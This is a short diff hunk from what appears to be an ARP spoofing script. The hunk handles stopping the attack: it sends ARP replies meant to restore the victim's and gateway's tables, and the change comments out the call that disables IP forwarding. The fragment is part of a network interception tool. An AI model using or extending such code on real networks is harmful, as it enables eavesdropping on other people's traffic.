@@ -112,7 +112,7 @@ def main():
             time.sleep(2)  # Repeat every 2 seconds
     except KeyboardInterrupt:
         print("\n[!] Stopping attack and restoring network...")
-        disable_ip_forwarding()
+        # disable_ip_forwarding()
 
         # Send legitimate ARP replies to restore the ARP tables
         send_arp_spoof(iface, victim_ip, victim_mac, gateway_ip, gateway_mac)
